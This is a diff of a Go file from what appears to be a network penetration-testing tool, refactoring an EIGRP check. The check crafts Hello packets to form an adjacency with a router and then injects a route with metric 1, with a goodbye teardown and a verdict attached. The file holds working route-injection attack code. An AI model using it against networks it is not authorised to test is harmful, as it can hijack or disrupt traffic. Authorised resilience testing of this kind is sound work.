@@ -19,9 +19,9 @@ import (
 	"go.aledante.io/FlowSeer/src/common/errs"
 
 	"go.aledante.io/FlowSeer/src/edge/netpen/attacks/internal/craft"
+	"go.aledante.io/FlowSeer/src/edge/netpen/check"
 	nl "go.aledante.io/FlowSeer/src/edge/netpen/layers"
 	"go.aledante.io/FlowSeer/src/edge/netpen/link"
-	"go.aledante.io/FlowSeer/src/edge/netpen/runner"
 )
 
 // EIGRP TLV types (RFC 7868).
@@ -50,41 +50,46 @@ type eigrpFinding struct {
 	Refused bool `json:"refused,omitempty"`
 }
 
-// RunEIGRP sends the fixture's hello and route update, with a goodbye
-// teardown armed before the first frame.
-//
-// It requires runner-provided dependencies. A missing response is tolerated
-// after 100 ms; a receive or decode failure stops the sequence. Cancellation
-// returns ctx.Err(). The fixture's Goodbye flag reports refusal; transmitted
-// updates do not confirm adjacency. Concurrent calls require separate dependencies.
-func RunEIGRP(ctx context.Context, deps runner.Deps) error {
+// RunEIGRP sends a hello and an update injecting the target's IPv4 route
+// from the attack leg's own addresses, with a goodbye teardown armed before
+// the first frame. The autonomous system number and the metric are probe
+// content. A response carrying the Goodbye flag within 100 ms is a refused
+// adjacency, which the verdict reports as resisted; otherwise the verdict
+// is pending, since route acceptance needs an update listener that phase 2
+// adds. A receive or decode failure stops the sequence. Cancellation
+// returns ctx.Err(). Concurrent calls require separate dependencies.
+func RunEIGRP(ctx context.Context, deps check.Deps) (check.Verdict, error) {
 	if err := ctx.Err(); err != nil {
-		return err
+		return check.Verdict{}, err
 	}
-	src := srcMAC()
+	if err := deps.Target.Need(check.FieldRoute4); err != nil {
+		return check.Verdict{}, err
+	}
+	addr := deps.AttackLeg.Addr()
 	asNum := uint16(100)
+	started := time.Now()
 
 	// Arm the teardown before the first frame.
 	// Teardown: goodbye Hello with the Goodbye flag set, which causes
 	// the target to remove the adjacency from its table.
-	goodbyePkt, err := craftEIGRPHello(src, asNum, eigrpFlagGoodbye)
+	goodbyePkt, err := craftEIGRPHello(addr, asNum, eigrpFlagGoodbye)
 	if err != nil {
-		return errs.Wrap(err, "eigrp: craft goodbye")
+		return check.Verdict{}, errs.Wrap(err, "eigrp: craft goodbye")
 	}
 	deps.Teardown.Arm("eigrp-goodbye", func(ctx context.Context) error {
 		return deps.AttackLeg.Send(ctx, goodbyePkt)
 	})
 
 	// Phase 1: Hello (Init flag).
-	helloPkt, err := craftEIGRPHello(src, asNum, eigrpFlagInit)
+	helloPkt, err := craftEIGRPHello(addr, asNum, eigrpFlagInit)
 	if err != nil {
-		return errs.Wrap(err, "eigrp: craft hello")
+		return check.Verdict{}, errs.Wrap(err, "eigrp: craft hello")
 	}
 	if err := deps.AttackLeg.Send(ctx, helloPkt); err != nil {
 		if ctx.Err() != nil {
-			return ctx.Err()
+			return check.Verdict{}, ctx.Err()
 		}
-		return errs.Wrap(err, "eigrp: send hello")
+		return check.Verdict{}, errs.Wrap(err, "eigrp: send hello")
 	}
 
 	// Phase 2: receive the target's response (adjacency formation).
@@ -95,10 +100,10 @@ func RunEIGRP(ctx context.Context, deps runner.Deps) error {
 	refused, rxErr := recvEIGRPAdjacency(rxCtx, deps.AttackLeg)
 	rxCancel()
 	if err := ctx.Err(); err != nil {
-		return err
+		return check.Verdict{}, err
 	}
 	if rxErr != nil && !errors.Is(rxErr, context.DeadlineExceeded) {
-		return rxErr
+		return check.Verdict{}, rxErr
 	}
 	if refused {
 		detail := eigrpFinding{
@@ -110,33 +115,33 @@ func RunEIGRP(ctx context.Context, deps runner.Deps) error {
 		}
 		detailBytes, _ := json.Marshal(detail)
 		deps.Emitter.Finding("eigrp", detailBytes)
-		return nil // clean teardown armed, no partial state
+		return check.Resisted("adjacency refused with a goodbye", time.Since(started)), nil
 	}
 
 	// Phase 3: route inject (Update with IPv4 Internal TLV).
-	injectPkt, err := craftEIGRPRouteInject(src, asNum)
+	injectPkt, err := craftEIGRPRouteInject(addr, asNum, deps.Target.Route4)
 	if err != nil {
-		return errs.Wrap(err, "eigrp: craft inject")
+		return check.Verdict{}, errs.Wrap(err, "eigrp: craft inject")
 	}
 	if err := deps.AttackLeg.Send(ctx, injectPkt); err != nil {
 		if ctx.Err() != nil {
-			return ctx.Err()
+			return check.Verdict{}, ctx.Err()
 		}
-		return errs.Wrap(err, "eigrp: send inject")
+		return check.Verdict{}, errs.Wrap(err, "eigrp: send inject")
 	}
 
 	// Emit the finding.
 	detail := eigrpFinding{
 		Action:  "eigrp-route-inject",
 		AS:      asNum,
-		Route:   "10.99.0.0/24",
+		Route:   deps.Target.Route4.String(),
 		Opcode:  "update",
 		Restore: "goodbye/flush teardown",
 	}
 	detailBytes, _ := json.Marshal(detail)
 	deps.Emitter.Finding("eigrp", detailBytes)
 
-	return nil
+	return check.Pending("no observable: route acceptance needs an update listener"), nil
 }
 
 // recvEIGRPAdjacency reads one frame from the leg and checks whether the
@@ -222,7 +227,7 @@ func extractIPPayload(frame []byte, proto int) ([]byte, error) {
 
 // craftEIGRPHello builds an EIGRP Hello packet: Ethernet → IPv4 (proto 88)
 // → EIGRP. Uses the owned [nl.EIGRP] layer for serialization.
-func craftEIGRPHello(src net.HardwareAddr, asNum uint16, flags uint32) ([]byte, error) {
+func craftEIGRPHello(addr link.Addr, asNum uint16, flags uint32) ([]byte, error) {
 	eigrp := &nl.EIGRP{
 		Version:          2,
 		Opcode:           nl.EIGRPOpcodeHello,
@@ -234,7 +239,7 @@ func craftEIGRPHello(src net.HardwareAddr, asNum uint16, flags uint32) ([]byte, 
 	}
 
 	eth := &layers.Ethernet{
-		SrcMAC:       src,
+		SrcMAC:       addr.MAC,
 		DstMAC:       eigrpMulticastMAC,
 		EthernetType: layers.EthernetTypeIPv4,
 	}
@@ -243,7 +248,7 @@ func craftEIGRPHello(src net.HardwareAddr, asNum uint16, flags uint32) ([]byte, 
 		IHL:      5,
 		TTL:      1,
 		Protocol: layers.IPProtocol(88),
-		SrcIP:    attackerIP,
+		SrcIP:    addr.IPv4,
 		DstIP:    eigrpMulticast,
 	}
 	return craft.Default(eth, ip, eigrp)
@@ -251,10 +256,11 @@ func craftEIGRPHello(src net.HardwareAddr, asNum uint16, flags uint32) ([]byte, 
 
 // craftEIGRPRouteInject builds an EIGRP Update carrying an IPv4 Internal
 // route TLV that injects 10.99.0.0/24 with metric 1.
-func craftEIGRPRouteInject(src net.HardwareAddr, asNum uint16) ([]byte, error) {
+func craftEIGRPRouteInject(addr link.Addr, asNum uint16, route *net.IPNet) ([]byte, error) {
 	// IPv4 Internal route TLV: type(2) + length(2) + metric data.
 	// The TLV value encodes: prefix length + destination + metric fields.
-	routeValue := buildIPv4InternalRouteTLV(24, net.IPv4(10, 99, 0, 0), 1)
+	prefixLen, _ := route.Mask.Size()
+	routeValue := buildIPv4InternalRouteTLV(prefixLen, route.IP, 1)
 
 	eigrp := &nl.EIGRP{
 		Version:          2,
@@ -270,7 +276,7 @@ func craftEIGRPRouteInject(src net.HardwareAddr, asNum uint16) ([]byte, error) {
 	}
 
 	eth := &layers.Ethernet{
-		SrcMAC:       src,
+		SrcMAC:       addr.MAC,
 		DstMAC:       eigrpMulticastMAC,
 		EthernetType: layers.EthernetTypeIPv4,
 	}
@@ -279,7 +285,7 @@ func craftEIGRPRouteInject(src net.HardwareAddr, asNum uint16) ([]byte, error) {
 		IHL:      5,
 		TTL:      1,
 		Protocol: layers.IPProtocol(88),
-		SrcIP:    attackerIP,
+		SrcIP:    addr.IPv4,
 		DstIP:    eigrpMulticast,
 	}
 	return craft.Default(eth, ip, eigrp)
